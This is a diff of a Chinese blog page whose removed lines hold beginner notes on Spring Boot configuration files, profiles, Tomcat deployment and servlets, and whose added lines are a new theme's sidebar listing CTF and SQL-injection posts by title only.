-<li><p>数组：</p>
-  <pre class="line-numbers language-java" data-language="java"><code class="language-java">address<span class="token operator">:</span>
-	<span class="token operator">-</span> beijing
-	<span class="token operator">-</span> shanghai
-address<span class="token operator">:</span> <span class="token punctuation">[</span>beijing<span class="token punctuation">,</span>shanghai<span class="token punctuation">]</span> <span class="token comment">//也可以采用一种默认数组下标的方式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  纯量，<strong>单引号忽略转义字符，双引号识别转义字符</strong></p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918093806.png"></p>
-</li>
-<li><p>参数引用</p>
-  <pre class="line-numbers language-none"><code class="language-none">name: lisi
-person:
-	name: $&#123;name&#125;
-&#x2F;&#x2F;这样在获取person.name时，就会输出lisi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-</li>
-</ol>
-<h2 id="读取配置文件的内容"><a href="#读取配置文件的内容" class="headerlink" title="读取配置文件的内容"></a>读取配置文件的内容</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918113134.png"></p>
-<ol>
-<li><p>注意，以下内容都是獲取application.properties/yml/yaml中的配置文件的内容</p>
-  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;name&#125;"</span><span class="token punctuation">)</span> <span class="token comment">//這樣可以獲取到一個application配置文件中的name屬性</span>
-<span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//然後需要一個變量來承接，而且一定要承接，爲其分配内存空間，否則會報錯,承接的變量變量名可以自定</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li><p>  可以理解為@Value中的内容是用來取數據，而承接是用來起別名</p>
-</li>
-<li><p>```java<br>  @Value(“{address[0]}”)<br>  private String msg;  //此時，msg的值就為address[0]</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-### 注入一個對象，環境對象
-
-1.   使用這種方法的目的就是不用@Value()去一個一個地注入，一次性整體注入進去
-
-&#96;&#96;&#96;java
-@Autowired; &#x2F;&#x2F;使用@Autowired注解自動注入
-private Environment env; &#x2F;&#x2F;在springboot程序啓動的時候，就會在spring boot容器中初始化好一個Environment對象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>通過getProperty方法，指定鍵的名稱，就可以獲取到鍵對應的屬性值了</p>
-  <pre class="line-numbers language-none"><code class="language-none">String env.getProperty(&quot;name&quot;);&#x2F;&#x2F;引號中寫鍵的名稱&#x2F;屬性的名稱<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-</li>
-</ol>
-<h3 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h3><ol>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918162453.png"></li>
-<li>  prefix参数：捕获配置文件中固定前缀的属性，然后依次赋值到这个类中</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918162639.png"></li>
-</ol>
-<h3 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h3><ol>
-<li>  @Component是基础注解，表示一个JavaBean可以被注入到spring容器中</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918163510.png"></li>
-<li>  上面这张图片，@Component表示这个person类被spring识别，是一个bean</li>
-</ol>
-<h2 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ol>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918163719.png"></li>
-<li>  在程序迁移时，数据库地址，端口等配置进行动态切换</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918164056.png"></li>
-</ol>
-<h3 id="注意配置文件的命名"><a href="#注意配置文件的命名" class="headerlink" title="注意配置文件的命名"></a>注意配置文件的命名</h3><ol>
-<li><p>都为</p>
-  <pre class="line-numbers language-none"><code class="language-none">application-xxx.properties<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>  模板：</p>
-</li>
-<li><p>  application-dev.properties 开发环境developer</p>
-</li>
-<li><p>  application-pro.properties 生产环境</p>
-</li>
-<li><p>  application-test.properties 测试环境</p>
-</li>
-</ol>
-<h3 id="profile配置方式"><a href="#profile配置方式" class="headerlink" title="profile配置方式"></a>profile配置方式</h3><ol>
-<li>  多profile文件方式</li>
-<li>  yml多文档方式</li>
-</ol>
-<h3 id="profile激活方式，多profile文件方式"><a href="#profile激活方式，多profile文件方式" class="headerlink" title="profile激活方式，多profile文件方式"></a>profile激活方式，多profile文件方式</h3><ol>
-<li><p>```<br>  spring.profiles.active=dev</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-2.   上面这个spring.profiles.active属性用来激活profile,后面的dev根据具体情况而定
-
-3.   例如dev是根据后缀application-dev.properties
-
-4.   pro是根据application-pro.properties
-
-### yml多文档方式
-
-1.   使用三个杠来分隔
-2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918181518.png)
-3.   spring.profiles.active属性来设定来调用哪一个properties
-
-
-
-### profile激活方式
-
-1.   配置文件
-2.   虚拟机参数
-3.   命令行参数
-
-### 利用虚拟机参数进行激活
-
-1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918182650.png)
-
-2.   在run&#x2F;debug configruation中更改配置
-
-3.   修改VM options参数为
-
-4.   &#96;&#96;&#96;java
-     -Dspring profiles active&#x3D;test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  虚拟机参数会覆盖配置文件中的配置</p>
-</li>
-</ol>
-<h3 id="使用命令行参数进行配置的修改"><a href="#使用命令行参数进行配置的修改" class="headerlink" title="使用命令行参数进行配置的修改"></a>使用命令行参数进行配置的修改</h3><ol>
-<li><p>  在program arguments中添加命令行参数</p>
-</li>
-<li><p>  将此参数修改为</p>
-</li>
-<li><pre><code class="java">  --spring.profiles.active=pro
-  <pre class="line-numbers language-none"><code class="language-none">
-### 注意
-
-1.   命令行参数和虚拟机参数激活的前提是在yml文件中写为多文档模式
-2.   后两种优点是不用一次次地修改配置文件
-
-## 实际生产中打成jar包的操作
-
-1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918183902.png)
-
-2.   运行jar包
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-  java -jar 文件名
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   添加命令行参数来激活profile
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-  java -jar 文件名 --spring.profiles.active=pro
-</code></pre>
-</li>
-</ol>
-<h2 id="springboot内部配置加载顺序"><a href="#springboot内部配置加载顺序" class="headerlink" title="springboot内部配置加载顺序"></a>springboot内部配置加载顺序</h2><ol>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918184909.png"></li>
-<li></li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/Javaweb/">
-                Untitled
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-08-18</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/Javaweb/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="Javaweb"><a href="#Javaweb" class="headerlink" title="Javaweb"></a>Javaweb</h1><h2 id="CS-和-BS-的区别"><a href="#CS-和-BS-的区别" class="headerlink" title="CS 和 BS 的区别"></a>CS 和 BS 的区别</h2><ol>
-<li>  CS架构是客户端服务器架构模式（需要在本地安装）</li>
-<li>  CS优点：充分利用客户端机器的资源，减轻服务器的负荷</li>
-<li>  CS缺点：需要安装；升级维护成本高</li>
-<li>  BS架构是浏览器服务器架构模式（不需要本地安装，只需要浏览器）</li>
-<li>  BS优点：客户端不需要安装；维护成本低</li>
-<li>  BS缺点：所有的计算和存储任务都是放在服务器端的，服务器负荷重</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220819000552.png"></li>
-</ol>
-<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><ol>
-<li>  Tomcat是一个web container，是web的容器，可以容纳多个项目</li>
-<li>  将一个项目部署到container叫做部署</li>
-</ol>
-<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><ol>
-<li><p>  在主目录下的webapps目录可以部署项目</p>
-</li>
-<li><p>  在webapps下新建目录，这个目录可以随意命名</p>
-</li>
-<li><p>在这个自由命名的目录下再新建一个文件夹，名字必须是(如下)，字母全部大写，中间是减号，不能随意命名</p>
-  <pre class="line-numbers language-none"><code class="language-none">WEB-INF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>  再WEB-INF同级的目录下放前后端web代码</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220819114653.png"></p>
-</li>
-<li><p>  在localhost:8080后面拼接上自己命名的文件夹名，再拼接上要打开的网页即可在浏览器中访问</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220819120126.png"></p>
-</li>
-</ol>
-<h2 id="创建javaweb项目"><a href="#创建javaweb项目" class="headerlink" title="创建javaweb项目"></a>创建javaweb项目</h2><ol>
-<li>  创建project -&gt; new module -&gt; 勾选  Java EE 下的 web application</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821002623.png"></li>
-<li>  才会有和源代码src同级的目录web,其中有web-INF</li>
-</ol>
-<h3 id="idea配置tomcat"><a href="#idea配置tomcat" class="headerlink" title="idea配置tomcat"></a>idea配置tomcat</h3><ol>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821003703.png"></p>
-</li>
-<li><p>  点击add configuration 后 点击editor</p>
-</li>
-<li><p>  左侧栏中添加tomcat local ,点击application server后面的configure,选择tomcat的bin目录的上一级目录，ok -&gt; apply</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821003526.png"></p>
-</li>
-<li><p>  点击deployment选项卡，加号，art…，选择项目</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821003930.png"></p>
-</li>
-<li><p>  这个选项卡表示在打开tomcat的时候，会自动用google浏览器打开这个URL</p>
-</li>
-<li><p>  更改这两个选项卡，在更新时进行热部署</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821004505.png"></p>
-</li>
-<li><p>  在更改tomcat的端口号时记得改idea的对应<strong>端口</strong>，而且不要用2000以内的端口号，因为<strong>2000以内的端口号已经被操作系统给占用了</strong></p>
-</li>
-<li><p>  启动 tomcat 的时候尽量用debug模式打开，可以在出问题时直接加断点调试</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821005331.png"></p>
-</li>
-<li><p>  当遇到了忘记勾选javaweb的选项时，从project structure选项卡中勾选，具体：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1AS4y177xJ?p=20&vd_source=f1c6eacc29a1986405eb2256b7b2317c">20-尚硅谷-Web-在idea下新建javaweb项目-部署-运行_哔哩哔哩_bilibili</a></p>
-</li>
-<li><p>当从别的地方拷贝过来的项目时，如果没有蓝色的小点，则需要添加web.xml,具体方法还是从project structure中找</p>
-<p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821100712.png"></p>
-</li>
-</ol>
-<h2 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ol>
-<li>  server 服务器端</li>
-<li>  let 小应用程序</li>
-</ol>
-<h3 id="add组件"><a href="#add组件" class="headerlink" title="add组件"></a>add组件</h3><ol>
-<li>  获取客户端发给我的数据</li>
-<li>  调用DAO中的方法完成添加功能</li>
-</ol>
-<h3 id="导包的方法"><a href="#导包的方法" class="headerlink" title="导包的方法"></a>导包的方法</h3><ol>
-<li>  如果想要导入tomcat的包，可以从project structure中导入</li>
-<li>  从左侧那一栏中选择module -&gt; 点击加号 -&gt; library</li>
-</ol>
-<h3 id="获取用户发来的数据"><a href="#获取用户发来的数据" class="headerlink" title="获取用户发来的数据"></a>获取用户发来的数据</h3><ol>
-<li><p>  普通的类不能获取用户发来的数据</p>
-</li>
-<li><p>  所以需要继承一个类，<strong>继承HttpServlet类</strong>，这个类不在jdk的包中，在Servlet api包中</p>
-</li>
-<li><p>  最简单的方法是加入tomcat的依赖，具体方法如下：</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821103542.png"></p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220821103617.png"></p>
-</li>
-<li><pre><code class="java">  public class AddServlet(这个是自己写的类) extends HttpServlet
-</code></pre>
-</li>
-</ol>
-<h3 id="调用DAO中的方法完成添加功能"><a href="#调用DAO中的方法完成添加功能" class="headerlink" title="调用DAO中的方法完成添加功能"></a>调用DAO中的方法完成添加功能</h3><ol>
-<li>  HttpServlet类中有doPost()方法，</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-        </section>
-    </div>
-</div>
-
-
-
-    <div class="row">
-        <div class="col-sm-12">
-            <div class="wrap-pagination">
-                <a class="" href="/page/3/">
-                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
-                </a>
-                <a class="" href="/page/5/">
-                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
-                </a>
+创建javaweb项目
+  创建project -&gt ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/#content-inner">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/#content-inner">12</a><a class="extend next" rel="next" href="/page/5/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看吧</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" title="蓝帽杯半决赛wp_电子取证部分">蓝帽杯半决赛wp_电子取证部分</a><time datetime="2023-09-16T13:26:55.732Z" title="发表于 2023-09-16 21:26:55">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/" title="蓝帽杯半决赛wp_web部分">蓝帽杯半决赛wp_web部分</a><time datetime="2023-09-16T13:18:03.466Z" title="发表于 2023-09-16 21:18:03">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构">数据结构</a><time datetime="2023-08-30T08:37:08.678Z" title="发表于 2023-08-30 16:37:08">2023-08-30</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
             </div>
-        </div>
-    </div>
-
-
-
-
-</div>
-
-<!-- Footer -->
-<div class="push"></div>
-
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    拒绝划水，拒绝摸鱼
-                </p>
-            </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2023%E5%A4%8D%E7%9B%98/">2023复盘</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">侧信道攻击</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">蓝帽杯半决赛wp_电子取证部分</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/">蓝帽杯半决赛wp_web部分</a>
-            </li>
-            
-        </ul>
-    </div>
-
-
-
-            
-<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
-    <h2>Categories</h2>
-    <ul>
-        
-        <li>
-            <a class="footer-post" href="/categories/CSS/">CSS</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/CSS/ing/">ing</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/Hadoop/">Hadoop</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/ing/">ing</a>
-        </li>
-        
-    </ul>
-</div>
-
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-github"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-twitter"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-facebook"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-instagram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-dribbble"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-telegram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-behance"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="http://dezhoutorizhao.github.io/blog6/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-500px"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="mailto:a18888200398@163.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-envelope-o"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="\#">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-rss"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                </ul>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
-                </div>
-            </div>
-        </div>
-    </div>
-</footer>
-
-<!-- After footer scripts -->
-
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
-
-<script src="/js/main.js"></script>
-
-
-<!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
-
-
-
-</body>
-
-</html>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/"><span class="card-category-list-name">CSS</span><span class="card-category-list-count">1</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">40</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/linux/"><span class="card-category-list-name">linux</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ping/"><span class="card-category-list-name">ping</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">sql注入</span><span class="card-category-list-count">2</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">手动注入</span><span class="card-category-list-count">1</span></a></li></ul></li></ul></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/" style="font-size: 1.1em; color: #999">手动注入</a> <a href="/tags/ing/" style="font-size: 1.43em; color: #99a6b9">ing</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.3em; color: #99a1ac">sql注入</a> <a href="/tags/Javaweb/" style="font-size: 1.1em; color: #999">Javaweb</a> <a href="/tags/%E7%B3%BB%E7%BB%9F/" style="font-size: 1.1em; color: #999">系统</a> <a href="/tags/%E5%AF%86%E9%92%A5/" style="font-size: 1.1em; color: #999">密钥</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 1.1em; color: #999">信息泄露</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 1.1em; color: #999">远程登录服务器</a> <a href="/tags/%E5%88%86%E7%9B%98/" style="font-size: 1.1em; color: #999">分盘</a> <a href="/tags/Hive/" style="font-size: 1.1em; color: #999">Hive</a> <a href="/tags/mysql/" style="font-size: 1.1em; color: #999">mysql</a> <a href="/tags/%E8%BF%9B%E5%88%B6/" style="font-size: 1.1em; color: #999">进制</a> <a href="/tags/tmux/" style="font-size: 1.1em; color: #999">tmux</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/" style="font-size: 1.1em; color: #999">脚本小子</a> <a href="/tags/phpstudy/" style="font-size: 1.1em; color: #999">phpstudy</a> <a href="/tags/Hadoop/" style="font-size: 1.1em; color: #999">Hadoop</a> <a href="/tags/CSS/" style="font-size: 1.1em; color: #999">CSS</a> <a href="/tags/go/" style="font-size: 1.3em; color: #99a1ac">go</a> <a href="/tags/PHP/" style="font-size: 1.3em; color: #99a1ac">PHP</a> <a href="/tags/ping/" style="font-size: 1.1em; color: #999">ping</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.1em; color: #999">编码</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/" style="font-size: 1.1em; color: #999">数据可视化</a> <a href="/tags/HTML/" style="font-size: 1.17em; color: #999c9f">HTML</a> <a href="/tags/awd/" style="font-size: 1.1em; color: #999">awd</a> <a href="/tags/%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%BC%8F%E6%B4%9E/" style="font-size: 1.1em; color: #999">网站备份漏洞</a> <a href="/tags/github/" style="font-size: 1.1em; color: #999">github</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.37em; color: #99a4b2">数据库</a> <a href="/tags/hadoop/" style="font-size: 1.23em; color: #999ea6">hadoop</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.1em; color: #999">机器学习</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 1.1em; color: #999">实战</a> <a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/Java/" style="font-size: 1.17em; color: #999c9f">Java</a> <a href="/tags/linux/" style="font-size: 1.37em; color: #99a4b2">linux</a> <a href="/tags/acm%E7%AE%97%E6%B3%95/" style="font-size: 1.23em; color: #999ea6">acm算法</a> <a href="/tags/vim/" style="font-size: 1.1em; color: #999">vim</a> <a href="/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/" style="font-size: 1.1em; color: #999">磁盘管理</a> <a href="/tags/ssh/" style="font-size: 1.1em; color: #999">ssh</a> <a href="/tags/IP/" style="font-size: 1.1em; color: #999">IP</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/" style="font-size: 1.23em; color: #999ea6">文件修复</a> <a href="/tags/goweb/" style="font-size: 1.1em; color: #999">goweb</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
